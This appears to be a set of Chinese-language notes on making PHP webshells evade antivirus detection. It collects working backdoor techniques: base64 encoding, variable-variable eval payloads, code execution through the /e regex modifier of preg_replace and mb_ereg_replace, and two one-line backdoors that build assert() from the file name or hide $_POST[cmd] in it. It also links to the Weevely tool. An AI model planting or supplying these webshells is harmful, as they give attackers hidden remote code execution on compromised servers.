## webshell 免杀记录

### preg_replace 变形

**webshell-1**

利用base64编码

**webshell-2**

还利用了PHP中的可变变量能够执行代码的特点。通过cmd=<title>${@eval($_POST[xxx])}</title>&xxx=phpinfo();这种方式就可以执行任意的代码了。

**Webshell-3**

preg_replace的/e模式用来执行代码，想必大家已经很熟悉了。但是他的兄弟姐妹mb_ereg_replace、mb_eregi_replace大家可能不太熟悉，其实它两的用法和第一个基本一样，支持传入e模式的正则表达式，进而执行任意代码

**Webshell-4**

免杀shell利用类中的静态函数，还用到了变量替换

**no_assert.php**

` <?php ${"function"}=substr(__FILE__,-10,-4);; ${"command"}=$_POST[cmd]; $function($command);` 

这种，得到的$function就是assert，这样就形成了assert($_POST[cmd]);的后门。

**$_POST[cmd].php**

` <?php ${"function"}= substr(__FILE__, -15, -4); ${"config"} = assert; $config($function);`

这个是将$_POST[cmd]放置在文件名中进行隐藏，同样可以达到隐藏的目的。

**Weevely**

加密工具

https://github.com/epinna/weevely3

